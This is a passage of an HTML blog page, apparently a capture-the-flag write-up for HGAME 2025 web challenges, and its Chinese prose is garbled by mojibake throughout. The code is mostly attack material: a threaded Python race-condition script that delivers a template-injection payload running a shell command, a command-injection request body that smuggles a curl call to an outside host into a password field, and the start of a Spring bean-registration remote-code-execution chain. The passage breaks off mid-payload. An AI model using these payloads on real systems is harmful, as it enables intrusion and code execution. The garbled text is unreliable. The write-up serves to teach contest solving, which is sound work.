src="/2025/02/04/HGAME2025-WEB/a3d0a8ba8a02ddb8fc4626a0eddd2d69.png" alt="img"></p><p>ä½†æ˜¯ä¸èƒ½ç©¿è¶Šç›®å½•å¥½åƒã€‚</p><p>é‚£ä¹ˆæˆ‘ä»¬ç›´æ¥å°†æºç ä¸€æŠŠæŠ“ä½ï¼Œé¡·åˆ»ç‚¼åŒ–ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, render_template, render_template_string, redirect<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> templates<br><br>app = Flask(__name__)<br>pwd = os.path.dirname(__file__)<br>show_msg = templates.show_msg<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">readmsg</span>():<br>    filename = pwd + <span class="hljs-string">&quot;/tmp/message.txt&quot;</span><br>    <span class="hljs-keyword">if</span> os.path.exists(filename):<br>        f = <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&#x27;r&#x27;</span>)<br>        message = f.read()<br>        f.close()<br>        <span class="hljs-keyword">return</span> message<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;No message now.&#x27;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/index&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-comment"># print(pwd)</span><br>    status = request.args.get(<span class="hljs-string">&#x27;status&#x27;</span>)<br>    <span class="hljs-keyword">if</span> status <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        status = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>, status=status)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/send&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write_message</span>():<br>    filename = pwd + <span class="hljs-string">&quot;/tmp/message.txt&quot;</span><br>    message = request.form[<span class="hljs-string">&#x27;message&#x27;</span>]<br><br>    f = <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&#x27;w&#x27;</span>)<br>    f.write(message)<br>    f.close()<br><br>    <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;index?status=Send successfully!!&#x27;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/read&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read_message</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;&#123;&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> readmsg():<br>        show = show_msg.replace(<span class="hljs-string">&quot;&#123;&#123;message&#125;&#125;&quot;</span>, readmsg())<br>        <span class="hljs-keyword">return</span> render_template_string(show)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;waf!!&#x27;</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">5000</span>)<br></code></pre></td></tr></table></figure><p>æˆ‘è¿˜å¤šè¯»äº†ä¸€äº›ä¸œè¥¿ï¼Œæœ¬åœ°æƒ³è·‘è·‘è¯•è¯•ã€‚</p><p>çœ‹åˆ°ä¸‹é¢çš„renderä¸€çœ¼SSTIï¼Œè¯•äº†ä¸‹ç¡®å®èƒ½ç›´æ¥å›æ˜¾ï¼Œä½†æ˜¯å·¦èŠ±æ‹¬å·<code>&#123;</code>åŸºæœ¬ç»™ä½ banï¼Œé‚£æ€ä¹ˆåŠï¼Ÿ</p><p>çœ‹ä¸€çœ¼å®¹å™¨åç§°-raceoutã€‚</p><p>æ¡ä»¶ç«äº‰æ²¡è·‘äº†ã€‚</p><p>å¤šçº¿ç¨‹ç›´æ¥è·‘&#x2F;sendï¼Œä¸€è¾¹ä¼ å†—ä½™é•¿ä¸€ç‚¹çš„æ–‡ä»¶å¡å®ƒçš„readmsg()ï¼Œä¸€è¾¹ä¼ SSTI-payloadï¼Œç›´æ¥é¡·åˆ»ç‚¼åŒ–äº†ï¼š</p><p><img src="/2025/02/04/HGAME2025-WEB/image-20250205171559597.png" alt="image-20250205171559597"></p><p>ï¼ˆè¿™é‡Œç”¨çš„é‚£ä¸ªmiscçš„æ–‡ä»¶æ¥å½“å†—ä½™ä¿¡æ¯ï¼Œå†…éƒ¨æ¶ˆåŒ–æŒºå¥½ç”¨ï¼Œä¸€æ‰“ä¸€ä¸ªå‡†ğŸ˜‹ğŸ˜‹ğŸ˜‹ï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> threading<br><br><span class="hljs-comment"># Define the URLs</span><br>send_url = <span class="hljs-string">&#x27;http://node2.hgame.vidar.club:30544/app/send&#x27;</span><br>read_url = <span class="hljs-string">&#x27;http://node2.hgame.vidar.club:30544/app/read&#x27;</span><br><br><span class="hljs-comment"># Define the messages</span><br>malicious_message = <span class="hljs-string">&#x27;&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[140].__init__.__globals__[&quot;__builtins__&quot;][&quot;__import__&quot;](&quot;os&quot;).popen(&quot;cat /flag&quot;).read()&#125;&#125;&#x27;</span><br><span class="hljs-comment"># here I got os._wrap_close to RCE</span><br><br><span class="hljs-comment"># Function to read the content of a file</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read_file_content</span>(<span class="hljs-params">file_path</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>        <span class="hljs-keyword">return</span> file.read()<br><br><br><span class="hljs-comment"># Function to send a message</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_message</span>(<span class="hljs-params">message</span>):<br>    response = requests.post(send_url, data=&#123;<span class="hljs-string">&#x27;message&#x27;</span>: message&#125;)<br>    <span class="hljs-keyword">return</span> response<br><br><br><span class="hljs-comment"># Function to read the message</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read_message</span>():<br>    response = requests.get(read_url)<br>    <span class="hljs-keyword">return</span> response.text<br><br><br><span class="hljs-comment"># Function to perform the race condition</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">race_condition</span>():<br>    <span class="hljs-comment"># Read the normal message from a file</span><br>    normal_message = read_file_content(<span class="hljs-string">&quot;F:\\Study\\CTF\\HGAME2025\\misc\\hky.txt&quot;</span>)<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-comment"># Send both messages simultaneously</span><br>        threading.Thread(target=send_message, args=(normal_message,)).start()<br>        threading.Thread(target=send_message, args=(malicious_message,)).start()<br><br>        <span class="hljs-comment"># Read the message</span><br>        response = read_message()<br>        <span class="hljs-built_in">print</span>(response)<br><br>        <span class="hljs-comment"># Check if useful output is in the response</span><br>        <span class="hljs-comment">#if &#x27;class&#x27; in response:</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;hgame&#x27;</span> <span class="hljs-keyword">in</span> response:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Race condition successful, stopping...&#x27;</span>)<br>            <span class="hljs-keyword">break</span><br><br><span class="hljs-comment"># Run the race condition in a separate thread</span><br>thread = threading.Thread(target=race_condition)<br>thread.start()<br>thread.join()<br></code></pre></td></tr></table></figure><p><img src="/2025/02/04/HGAME2025-WEB/image-20250205171550573.png" alt="image-20250205171550573"></p><p>WEEK1è½»æ¾æ‹¿ä¸‹ï¼š</p><p><img src="/2025/02/04/HGAME2025-WEB/image-20250205171615663.png" alt="image-20250205171615663"></p><hr><h1 id="WEEK2"><a href="#WEEK2" class="headerlink" title="WEEK2"></a>WEEK2</h1><p>æ¥çœ‹çœ‹WEEK2çš„ã€‚</p><h2 id="Level-21096-HoneyPot"><a href="#Level-21096-HoneyPot" class="headerlink" title="Level 21096 HoneyPot"></a>Level 21096 HoneyPot</h2><p>å®¡è®¡æºç ï¼Œ</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ImportData</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br><span class="hljs-keyword">var</span> config ImportConfig<br><span class="hljs-keyword">if</span> err := c.ShouldBindJSON(&amp;config); err != <span class="hljs-literal">nil</span> &#123;<br>c.JSON(http.StatusBadRequest, gin.H&#123;<br><span class="hljs-string">&quot;success&quot;</span>: <span class="hljs-literal">false</span>,<br><span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Invalid request body: &quot;</span> + err.Error(),<br>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">if</span> err := validateImportConfig(config); err != <span class="hljs-literal">nil</span> &#123;<br>c.JSON(http.StatusBadRequest, gin.H&#123;<br><span class="hljs-string">&quot;success&quot;</span>: <span class="hljs-literal">false</span>,<br><span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Invalid input: &quot;</span> + err.Error(),<br>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><br>config.RemoteHost = sanitizeInput(config.RemoteHost)<br>config.RemoteUsername = sanitizeInput(config.RemoteUsername)<br>config.RemoteDatabase = sanitizeInput(config.RemoteDatabase)<br>config.LocalDatabase = sanitizeInput(config.LocalDatabase)<br><span class="hljs-keyword">if</span> manager.db == <span class="hljs-literal">nil</span> &#123;<br>dsn := buildDSN(localConfig)<br>db, err := sql.Open(<span class="hljs-string">&quot;mysql&quot;</span>, dsn)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>c.JSON(http.StatusInternalServerError, gin.H&#123;<br><span class="hljs-string">&quot;success&quot;</span>: <span class="hljs-literal">false</span>,<br><span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Failed to connect to local database: &quot;</span> + err.Error(),<br>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-keyword">if</span> err := db.Ping(); err != <span class="hljs-literal">nil</span> &#123;<br>db.Close()<br>c.JSON(http.StatusInternalServerError, gin.H&#123;<br><span class="hljs-string">&quot;success&quot;</span>: <span class="hljs-literal">false</span>,<br><span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Failed to ping local database: &quot;</span> + err.Error(),<br>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><br>manager.db = db<br>&#125;<br><span class="hljs-keyword">if</span> err := createdb(config.LocalDatabase); err != <span class="hljs-literal">nil</span> &#123;<br>c.JSON(http.StatusInternalServerError, gin.H&#123;<br><span class="hljs-string">&quot;success&quot;</span>: <span class="hljs-literal">false</span>,<br><span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Failed to create local database: &quot;</span> + err.Error(),<br>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-comment">//Never able to inject shell commands,Hackers can&#x27;t use this,HaHa</span><br>command := fmt.Sprintf(<span class="hljs-string">&quot;/usr/local/bin/mysqldump -h %s -u %s -p%s %s |/usr/local/bin/mysql -h 127.0.0.1 -u %s -p%s %s&quot;</span>,<br>config.RemoteHost,<br>config.RemoteUsername,<br>config.RemotePassword,<br>config.RemoteDatabase,<br>localConfig.Username,<br>localConfig.Password,<br>config.LocalDatabase,<br>)<br>fmt.Println(command)<br>cmd := exec.Command(<span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, command)<br><span class="hljs-comment">//cmd := exec.Command(&quot;cmd&quot;, &quot;/C&quot;, command)</span><br><span class="hljs-keyword">if</span> err := cmd.Run(); err != <span class="hljs-literal">nil</span> &#123;<br>c.JSON(http.StatusInternalServerError, gin.H&#123;<br><span class="hljs-string">&quot;success&quot;</span>: <span class="hljs-literal">false</span>,<br><span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Failed to import data: &quot;</span> + err.Error(),<br>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><br>c.JSON(http.StatusOK, gin.H&#123;<br><span class="hljs-string">&quot;success&quot;</span>: <span class="hljs-literal">true</span>,<br><span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Data imported successfully&quot;</span>,<br>&#125;)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">sanitizeInput</span><span class="hljs-params">(input <span class="hljs-type">string</span>)</span></span> <span class="hljs-type">string</span> &#123;<br>reg := regexp.MustCompile(<span class="hljs-string">`[;&amp;|&gt;&lt;\(\)\&#123;\&#125;\[\]\\]`</span>)<br><span class="hljs-keyword">return</span> reg.ReplaceAllString(input, <span class="hljs-string">&quot;&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°RemotePasswordæ²¡æœ‰è¢«æ­£åˆ™åŒ¹é…ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥åœ¨è¿™é‡Œæ‰“å‘½ä»¤æ³¨å…¥ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sh -c mysqldump -h vps -u root -p;curl http://vps:1234 hahaha |mysql -h 127.0.0.1 -u root -proot <span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure><p>POSTä¼ å‚ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;remote_host&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;vps&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;remote_port&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;3306&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;remote_username&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;root&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;remote_password&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;;curl http://vps:1234;&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;remote_database&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;hahaha&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;local_database&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;test&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/2025/02/04/HGAME2025-WEB/image-20250214013529080.png" alt="image-20250214013529080"></p><p><img src="/2025/02/04/HGAME2025-WEB/image-20250214005657345.png" alt="image-20250214005657345"></p><h2 id="Level-21096-HoneyPot-Revenge"><a href="#Level-21096-HoneyPot-Revenge" class="headerlink" title="Level 21096 HoneyPot_Revenge"></a>Level 21096 HoneyPot_Revenge</h2><p>å®¡è®¡æºç ï¼Œå‘ç°æ‰€æœ‰çš„ä¼ å‚éƒ½è¢«æ­£åˆ™äº†ï¼Œè€Œä¸”æ­£åˆ™æ˜¯ç™½åå•ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">sanitizeInput</span><span class="hljs-params">(input <span class="hljs-type">string</span>)</span></span> <span class="hljs-type">string</span> &#123;<br>    sanitized := strings.TrimSpace(input)<br>    <span class="hljs-keyword">if</span> matched, _ := regexp.MatchString(<span class="hljs-string">`^[a-zA-Z0-9_.-]+$`</span>, sanitized); !matched &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> sanitized<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸èƒ½ç›´æ¥å‘½ä»¤æ³¨å…¥äº†ã€‚</p><p>è¿™é‡Œæˆ‘æ˜¯æ²¡æ‰“å‡ºæ¥ï¼Œè€Œä¸”åé¢ä¹Ÿæ‡’å¾—çœ‹äº†ã€‚å®˜æ–¹wpçš„åšæ³•æ˜¯æœ¬åœ°èµ·ä¸€ä¸ªmysqlï¼Œè®©å¯¼â¼Šè¯­å¥è·å–åˆ°æ¶æ„çš„sqlï¼Œä»è€Œå¯¼å…¥è¿›mysqlè¯­å¥æ¥è¿›â¾RCE,è§¦å‘<code>/writeflag</code>æ¥è§¦å‘RCEã€‚</p><p>æ€è·¯å°±æ˜¯å»æ›´æ”¹MySQLçš„ç‰ˆæœ¬å·,ä»è€Œæ³¨å…¥<code>\!</code>æ¥Rã€‚</p><p>è²Œä¼¼æ˜¯æ‰“çš„mysqldumpçš„CVEï¼š<a href="https://www.freebuf.com/vuls/411090.html">CVE-2024-21096ï¼šMySQLDumpææƒæ¼æ´åˆ†æ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p><p>å°±æ˜¯ç”¨ç‰ˆæœ¬ä¿¡æ¯æ¥æ‰“çš„ã€‚æœ‰å…´è¶£å¯ä»¥å»çœ‹çœ‹ã€‚è¿™é‡Œå°±ä¸å¤ç°äº†ã€‚</p><h2 id="Level-60-SignInJava"><a href="#Level-60-SignInJava" class="headerlink" title="Level 60 SignInJava"></a>Level 60 SignInJava</h2><p>å®¡è®¡æºç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&#123;&quot;/api&quot;&#125;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">APIGatewayController</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">APIGatewayController</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-meta">@RequestMapping(</span><br><span class="hljs-meta">        value = &#123;&quot;/gateway&quot;&#125;,</span><br><span class="hljs-meta">        method = &#123;RequestMethod.POST&#125;</span><br><span class="hljs-meta">    )</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-keyword">public</span> BaseResponse <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest request)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">body</span> <span class="hljs-operator">=</span> IOUtils.toString(request.getReader());<br>            Map&lt;String, Object&gt; map = (Map)JSON.parseObject(body, Map.class);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">beanName</span> <span class="hljs-operator">=</span> (String)map.get(<span class="hljs-string">&quot;beanName&quot;</span>);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">methodName</span> <span class="hljs-operator">=</span> (String)map.get(<span class="hljs-string">&quot;methodName&quot;</span>);<br>            Map&lt;String, Object&gt; params = (Map)map.get(<span class="hljs-string">&quot;params&quot;</span>);<br>            <span class="hljs-keyword">if</span> (StrUtil.containsAnyIgnoreCase(beanName, <span class="hljs-keyword">new</span> <span class="hljs-title class_">CharSequence</span>[]&#123;<span class="hljs-string">&quot;flag&quot;</span>&#125;)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BaseResponse</span>(<span class="hljs-number">403</span>, <span class="hljs-string">&quot;flagTestService offline&quot;</span>, (Object)<span class="hljs-literal">null</span>);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> InvokeUtils.invokeBeanMethod(beanName, methodName, params);<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BaseResponse</span>(<span class="hljs-number">200</span>, (String)<span class="hljs-literal">null</span>, result);<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BaseResponse</span>(<span class="hljs-number">500</span>, ((Throwable)Objects.requireNonNullElse(e.getCause(), e)).getMessage(), (Object)<span class="hljs-literal">null</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°è¿™é‡Œéœ€è¦æä¾›Springçš„beanï¼Œå¯ä»¥å¯¹åº”åˆ°ç±»ä¸Šï¼Œæä¾›è¯¥beanç±»çš„æ–¹æ³•å’Œå‚æ•°ï¼Œç„¶åå°±ä¼šinvokeè§¦å‘è¿™ä¸ªæ–¹æ³•ã€‚</p><p>å½“ç„¶ç»™çš„<code>FlagTestService#catFlag</code>è§¦å‘ä¸äº†ï¼Œå› ä¸º<code>flag</code>è¿™é‡Œè¢«banäº†è€Œä¸”ç»•ä¸äº†ã€‚</p><p>ä½†æ˜¯è½¬å¿µä¸€æƒ³ï¼Œè¿™é‡Œæ—¢ç„¶éƒ½èƒ½invokeç›´æ¥è§¦å‘æ–¹æ³•äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬èƒ½ä¸èƒ½æ‰¾åˆ°ä¸€ä¸ªbeanç±»å…ˆä½¿ç”¨è¿™ä¸ªä»£ç æ³¨å†Œä¸€ä¸ªæ¶æ„beanï¼Œç„¶ååœ¨è°ƒç”¨è¿™ä¸ªæ¶æ„beançš„æ–¹æ³•æ¥Rå‘¢ï¼Ÿ</p><p>è¿™ä¸ªæ–¹æ³•æ˜¯å¯è¡Œçš„ã€‚æœ¬åœ°è°ƒè¯•çš„æ—¶å€™å°†è§†è§’æ”¾åˆ°äº†<code>cn.hutool</code>çš„ä¸€ç³»åˆ—åŒ…ï¼Œä»ä¸­æ‰¾åˆ°äº†ä¸€ä¸ªå®Œç¾å¥‘åˆéœ€æ±‚çš„ä¸œè¥¿ï¼ˆæ„Ÿè§‰å‡ºé¢˜äººå°±æ˜¯ä¸ºäº†è¿™å é†‹æ‰åŒ…äº†è¿™ç›˜é¥ºå­å§ï¼‰ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">cn.hutool.extra.spring.SpringUtil#registerBean<br></code></pre></td></tr></table></figure><p><img src="/2025/02/04/HGAME2025-WEB/image-20250219004318408.png" alt="image-20250219004318408"></p><p>è¿™ä¸ªæ–¹æ³•å¯ä»¥å¸®åŠ©æˆ‘ä»¬æ³¨å†Œä¸€ä¸ªæ¶æ„beanå¯¹è±¡ï¼Œé‚£ä¹ˆéœ€è¦æ³¨å†Œçš„èƒ½å®ç°RCEçš„ä¹Ÿèƒ½æ‰¾åˆ°ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">cn.hutool.core.util.RuntimeUtil#execForStr<br></code></pre></td></tr></table></figure><p><img src="/2025/02/04/HGAME2025-WEB/image-20250219004444051.png" alt="image-20250219004444051"></p><p><img src="/2025/02/04/HGAME2025-WEB/image-20250219004452969.png" alt="image-20250219004452969"></p><p>æ¸¸æˆç»“æŸäº†ã€‚</p><p>srdsåº”è¯¥èƒ½æ‰¾åˆ°çš„æ¶æ„ç±»ä¸æ­¢è¿™ä¸ªï¼Œåœ¨å®ƒåŒ…é‡Œèƒ½ç”¨çš„åº”è¯¥è¿˜æœ‰å…¶ä»–çš„ã€‚</p><p>æ€è·¯å‡ºæ¥äº†ï¼Œç¬¬ä¸€æ¬¡æ³¨å†Œä¸€ä¸ªæ¶æ„beanï¼Œåå­—å–ä½œ<code>evilCmd</code>ï¼ŒbeanNameæä¾›ä¸º<code>cn.hutool.extra.spring.SpringUtil</code>ï¼Œæ³¨å†Œç±»ä¸º<code>cn.hutool.core.RuntimeUtil</code>ï¼Œæ³¨æ„è¿™é‡Œæ³¨å†Œç±»è¦ä½¿ç”¨<code>@type</code>ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;beanName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cn.hutool.extra.spring.SpringUtil&quot;</span><span class="hljs-punctuation">,</span><br>  